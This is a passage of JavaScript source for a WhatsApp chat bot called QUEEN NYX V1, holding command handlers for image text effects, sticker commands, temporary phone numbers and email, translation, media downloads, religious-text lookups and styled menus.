if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
PrexzyVilla.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'setcmd': {
                if (!m.quoted) return replygcprexzy('Reply Message!')
                if (!m.quoted.fileSha256) return replygcprexzy('SHA256 Hash Missing')
                if (!text) return replygcprexzy(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcprexzy('You have no permission to change this sticker command')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcprexzy(`Done!`)
            }
            break
            case 'tempnumber': {
    if (!global.tempNumbers) global.tempNumbers = {}; // Ensure storage

    let userId = m.sender;

    try {
        let response = await fetch('https://www.receivesms.io/free-phone-numbers');
        let data = await response.json();

        if (!data || !data.numbers || data.numbers.length === 0) {
            throw "❌ No available temporary numbers.";
        }

        let randomNumber = data.numbers[Math.floor(Math.random() * data.numbers.length)];
        let phoneNumber = randomNumber.number;
        let country = randomNumber.country;
        let link = `https://www.receivesms.io/sms/${phoneNumber}`;

        // Save user-specific number
        global.tempNumbers[userId] = phoneNumber;

        let msg = `📱 *Temporary Number Created!*\n\n📞 *Number:* ${phoneNumber}\n🌍 *Country:* ${country}\n📩 *Check SMS:* ${link}\n\nUse *${prefix}checkotp* to check received messages.`;
        replygcprexzy(msg);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error getting temporary number. Try again later.");
    }
}
break
case 'checkotp': {
    let userId = m.sender;

    if (!global.tempNumbers || !global.tempNumbers[userId]) {
        return replygcprexzy("❌ No temporary number found. Use *${prefix}tempnumber* first.");
    }

    let phoneNumber = global.tempNumbers[userId];

    try {
        let response = await fetch(`https://www.receivesms.io/sms/${phoneNumber}`);
        let data = await response.json();

        if (!data || !data.messages || data.messages.length === 0) {
            return replygcprexzy("📭 No new OTP messages yet. Try again later.");
        }

        let latestSMS = data.messages[0];
        let from = latestSMS.from;
        let text = latestSMS.text;
        let receivedAt = latestSMS.received_at;

        let smsMessage = `📩 *New OTP Message!*\n\n📬 *From:* ${from}\n📅 *Received At:* ${receivedAt}\n📝 *Message:* ${text}`;
        replygcprexzy(smsMessage);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error checking messages. Try again later.");
    }
}
break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcprexzy(`No hashes`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygcprexzy('You have no permission to delete this sticker command')             
                delete global.db.data.sticker[hash]
                replygcprexzy(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                PrexzyVilla.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!PrexzyTheCreator) return PrexzyStickOwner()
                if (!m.quoted) return replygcprexzy('Reply Message!')
                if (!m.quoted.fileSha256) return replygcprexzy('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return replygcprexzy('Hash not found in database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                replygcprexzy('Done!')
            }
            break
case 'ssweb': {
    if (!q) return replygcprexzy(`Example: ${prefix + command} https://github.com/nazedev/naze-md`);

    try {
        let url = 'https://' + q.replace(/^https?:\/\//, '');
        let ssUrl = `https://image.thum.io/get/width/1900/crop/1000/fullpage/${url}`;

        PrexzyVilla.sendMessage(m.chat, {
            image: { url: ssUrl },
            caption: '✅ *Website Screenshot Successfully Captured!*'
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        replygcprexzy('❌ Server is currently offline for website screenshots. Please try again later.');
    }
}
break;
case 'pickupline': {
try {
    let res = await fetch(`https://api.popcat.xyz/pickuplines`)
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`)
    }
    let json = await res.json()
    let pickupLine = `*Here's a pickup line for you:*\n\n${json.pickupline}`
    replygcprexzy(pickupLine)
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
  }
  break
  case 'animequote': case 'animequotes': {
    try {
        replygcprexzy('*🔍 Fetching a random anime quote...*');

        let response = await fetch('https://animechan.xyz/api/random');
        let data = await response.json();

        if (!data || !data.quote) {
            throw '*⚠️ Failed to retrieve an anime quote!*';
        }

        let quoteText = `🎌 *Anime Quote*\n\n`;
        quoteText += `📝 *Quote:* "${data.quote}"\n`;
        quoteText += `🎭 *Character:* ${data.character}\n`;
        quoteText += `📺 *Anime:* ${data.anime}\n\n`;
        quoteText += `DONE BY QUEEN NYX 👑`;

        replygcprexzy(quoteText);

    } catch (error) {
        console.error(error);
        replygcprexzy('*❌ Failed to fetch an anime quote. Please try again later.*\n\nDONE BY QUEEN NYX 👑');
    }
}
break
case 'bible': {
    if (!text) return replygcprexzy(`📖 *Example Usage:*\n${prefix + command} John 3:16`);

    try {
        replygcprexzy('*📖 Fetching Bible verse from JW.org...*');

        let searchQuery = text.replace(/ /g, '-'); // Convert spaces to dashes for JW.org format
        let apiUrl = `https://b.jw-cdn.org/apis/pub-media/GETPUBMEDIALINKS?langwritten=en&pub=nwtsty&issue=&output=json&track=${searchQuery}`;

        let response = await fetch(apiUrl);
        let data = await response.json();

        if (!data || !data.files || data.files.length === 0) {
            throw "❌ Verse not found or not available in New World Translation.";
        }

        let verseText = data.files[0].title; // Extract verse text
        let verseAudio = data.files[0].file.mp3 || null; // Audio if available

        let result = `📖 *New World Translation (NWT)*\n\n📜 *Verse:* ${text}\n📖 *Text:* "${verseText}"\n\n✅ *DONE BY QUEEN NYX 👑*`;

        if (verseAudio) {
            PrexzyVilla.sendMessage(m.chat, { text: result, audio: { url: verseAudio }, mimetype: 'audio/mp4' }, { quoted: m });
        } else {
            replygcprexzy(result);
        }

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Failed to fetch Bible verse from JW.org. Try again later.\n\n✅ *DONE BY QUEEN NYX 👑*");
    }
}
break
  case 'tr':{
  	if (!q) return replygcprexzy(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       replygcprexzy(result.text)
    } catch (e) {
        return replygcprexzy(err)
    } 
    }
    break
    case 'tourl': {
    if (!m.quoted) return replygcprexzy(`📌 *Reply to an image or video with* ${prefix + command}`);
    
    let mime = (m.quoted.msg || m.quoted).mimetype || '';
    if (!mime) return replygcprexzy(`⚠️ No media found! Please reply to an image, video, or document.`);

    await PrexzyStickWait(); // Loading indicator

    try {
        let media = await PrexzyVilla.downloadAndSaveMediaMessage(m.quoted);
        let response;
        
        if (/image|video/.test(mime)) {
            response = await CatBox(media);
        } else {
            response = await pomfCDN(media);
        }

        if (!response) throw new Error('Upload failed!');

        let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
        let uploadDate = new Date().toLocaleString();
        let uploader = m.pushName;

        let caption = `🔗 *Media Link:* ${response}\n📅 *Upload Date:* ${uploadDate}\n📂 *File Size:* ${fileSize} KB\n👤 *Uploader:* ${uploader}\n\nDONE BY QUEEN NYX 👑`;
        replygcprexzy(caption);

        await fs.unlinkSync(media); // Delete temp file

    } catch (err) {
        console.error(err);
        replygcprexzy(`❌ Error uploading media. Try again later.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'hide': {
    if (!m.mentionedJid[0]) return replygcprexzy(`📌 *Example:* ${prefix + command} @user This is a secret!`);

    let mentionedUser = m.mentionedJid[0];
    let secretMessage = args.slice(1).join(" ");
    
    if (!secretMessage) return replygcprexzy("❌ *You need to enter a message!*");

    PrexzyVilla.sendMessage(mentionedUser, { text: `🔒 *Secret Message from @${m.sender.split("@")[0]}:*\n\n${secretMessage}` }, { quoted: m });
    replygcprexzy("✅ *Secret message sent!*");
}
break
case 'fetch': case 'get': {
    if (!text.startsWith('http')) return replygcprexzy(`📌 *Invalid URL!*\n\nExample: ${prefix + command} https://google.com`);

    try {
        replygcprexzy('*⏳ Fetching data... Please wait...*');

        const res = await axios.get(text);
        const contentType = res.headers['content-type'];

        if (/json/.test(contentType)) {
            replygcprexzy(`📜 *Fetched JSON Data:*\n\`\`\`${util.format(res.data)}\`\`\``);
        } else if (/html/.test(contentType) || /plain/.test(contentType)) {
            replygcprexzy(`🌍 *Fetched Webpage Content:*\n\n${res.data.substring(0, 4096)}`);
        } else {
            replygcprexzy(`🔗 *Fetched URL Content:*\n\n${text}`);
        }

    } catch (error) {
        console.error(error);
        replygcprexzy(`❌ Failed to fetch data. URL may be invalid or blocked.\n\nDONE BY QUEEN NYX 👑`);
    }
}
break
case 'tempmail': {
    if (!global.tempEmails) global.tempEmails = {}; // Ensure storage exists

    let userId = m.sender; // Get the user's ID

    try {
        let response = await fetch('https://www.1secmail.com/api/v1/?action=genRandomMailbox');
        let data = await response.json();
        if (!data || !data[0]) throw "❌ Failed to generate temporary email.";

        let email = data[0];
        let username = email.split('@')[0];
        let domain = email.split('@')[1];

        // Store email per user
        global.tempEmails[userId] = { email, username, domain };

        let msg = `📩 *Temporary Email Created!*\n\n📧 *Email:* ${email}\n🕒 Valid for a short time\n\nUse *${prefix}checkmail* to check messages.`;
        replygcprexzy(msg);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error generating temporary email. Try again later.");
    }
}
break
case 'readmail': {
    let userId = m.sender;

    if (!global.tempEmails || !global.tempEmails[userId]) {
        return replygcprexzy("❌ No temporary email found. Use *${prefix}tempmail* first.");
    }
    
    if (!text) return replygcprexzy("📌 *Example Usage:*\n*${prefix}readmail 123456*");

    let { username, domain } = global.tempEmails[userId];
    let msgId = text.trim();

    try {
        let response = await fetch(`https://www.1secmail.com/api/v1/?action=readMessage&login=${username}&domain=${domain}&id=${msgId}`);
        let data = await response.json();

        if (!data || !data.body) throw "❌ Error fetching email content.";

        let fullEmail = `📩 *Email Content:*\n\n📜 *Subject:* ${data.subject}\n📬 *From:* ${data.from}\n📅 *Date:* ${data.date}\n\n📖 *Message:* ${data.body}`;
        replygcprexzy(fullEmail);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error reading the email. Try again later.");
    }
}
break
case 'checkmail': {
    let userId = m.sender; // Identify user

    if (!global.tempEmails || !global.tempEmails[userId]) {
        return replygcprexzy("❌ No temporary email found. Use *${prefix}tempmail* first.");
    }

    let { username, domain, email } = global.tempEmails[userId];

    try {
        let response = await fetch(`https://www.1secmail.com/api/v1/?action=getMessages&login=${username}&domain=${domain}`);
        let data = await response.json();

        if (!data || data.length === 0) return replygcprexzy("📭 No new messages yet. Try again later.");

        let latestMail = data[0];
        let msgId = latestMail.id;
        let from = latestMail.from;
        let subject = latestMail.subject;

        let fullMessage = `📩 *New Email Received!*\n\n📬 *From:* ${from}\n📜 *Subject:* ${subject}\n\nUse *${prefix}readmail ${msgId}* to read full message.`;
        replygcprexzy(fullMessage);

    } catch (error) {
        console.error(error);
        replygcprexzy("❌ Error checking emails. Try again later.");
    }
}
break
  case 'translate':{
  	if (!q) return replygcprexzy(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       replygcprexzy(result.text)
    } catch (e) {
        return replygcprexzy(err)
    } 
    }
    break
    case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcprexzy(quranSurah)

    if (json.data.recitation.full) {
      PrexzyVilla.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcprexzy(`Error: ${error.message}`)
  }
  }
  break
case 'mediafire': {
    if (!text) return replygcprexzy(`Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`);
    if (!text.includes('mediafire.com')) return replygcprexzy('❌ Invalid Mediafire URL!');

    try {
        replygcprexzy('*⏳ Fetching file from Mediafire... Please wait...*');

        const anu = await mediafireDl(text);

        if (!anu || !anu.link) {
            return replygcprexzy('❌ Failed to fetch Mediafire file.');
        }

        const fileName = decodeURIComponent(anu.name);
        const fileSize = anu.size;
        const fileUrl = anu.link;

        let caption = `📂 *MEDIAFIRE DOWNLOAD*\n\n`;
        caption += `📌 *File Name:* ${fileName}\n`;
        caption += `📏 *Size:* ${fileSize}\n`;
        caption += `🔗 *Download Link:* ${fileUrl}\n\n`;
        caption += `DONE BY QUEEN NYX 👑`;

        await PrexzyVilla.sendMessage(m.chat, { text: caption }, { quoted: m });

    } catch (e) {
        console.error(e);
        replygcprexzy('❌ Server is offline or the Mediafire link is invalid.\n\nDONE BY QUEEN NYX 👑');
    }
}
break
    case 'tagadmin': case 'listadmin': case 'admin':{
    	if (!m.isGroup) return PrexzyStickgroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Group Admins:*
${listAdmin}
`.trim()
    PrexzyVilla.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygcprexzy(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygcprexzy(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygcprexzy(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      PrexzyVilla.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
      PrexzyVilla.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcprexzy(`Total Features of ${botname} is ${prexzyfeature()}`)
        break
            case 'menu': case 'help': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗤𝗨𝗘𝗘𝗡 𝗡𝗬𝗫 𝗩𝟭 👑 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Hi there, I am QUEEN NYX V1!* 🌟
Type .allmenu to see my full menu.

🎯 *Command List:*
┌ ◦ 🛠 Show all bot features: *.allmenu*
╰ ◦ 📜 Show categorized menu: *.menulist*

🚀 *Stay updated & enjoy!*
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
© 2025 QUEEN NYX V1 👸`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://files.catbox.moe/kp8w9p.jpeg'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'allmenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let introText = `
╭━━ ⪩⪨ 𝗤𝗨𝗘𝗘𝗡 𝗡𝗬𝗫 𝗩𝟭 👑 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to QUEEN NYX V1's Menu!* 🌟  
Here you can explore all my features and commands.  

📜 **Command List Below:**  
`
    let xmenu_oh = `${introText}${readmore}\n\n${allmenu(prefix, hituet)}`

    if (typemenu === 'v1') {
        PrexzyVilla.sendMessage(m.chat, {
            image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
            caption: xmenu_oh
        }, { quoted: m })
    } else if (typemenu === 'v2') {
        PrexzyVilla.sendMessage(m.chat, {
            text: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m })
    } else if (typemenu === 'v3') {
        PrexzyVilla.sendMessage(m.chat, {
            video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
            caption: xmenu_oh
        }, { quoted: m })
    } else if (typemenu === 'v4') {
        PrexzyVilla.sendMessage(m.chat, {
            video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
            caption: xmenu_oh,
            gifPlayback: true
        }, { quoted: m })
    } else if (typemenu === 'v5') {
        PrexzyVilla.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
                callType: "AUDIO",
                scheduledTimestampMs: 1200,
                title: xmenu_oh
            }
        }, {})
    } else if (typemenu === 'v6') {
        PrexzyVilla.relayMessage(m.chat, {
            requestPaymentMessage: {
                currencyCodeIso4217: 'INR',
                amount1000: '9999999900',
                requestFrom: m.sender,
                noteMessage: {
                    extendedTextMessage: {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true
                            }
                        }
                    }
                }
            }
        }, {})
    } else if (typemenu === 'v7') {
        PrexzyVilla.sendMessage(m.chat, {
            document: {
                url: 'https://files.catbox.moe/kp8w9p.jpeg'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: fstatus })
    } else if (typemenu === 'v8') {
        PrexzyVilla.sendMessage(m.chat, {
            video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
            gifPlayback: true,
            caption: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m })
    }
}
break
            case 'ownermenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 👑 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the OWNER MENU!* 🌟  
This section contains commands **only for the bot owner**.  

📜 **Available Owner Commands:**  
${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'othermenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 🛠 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
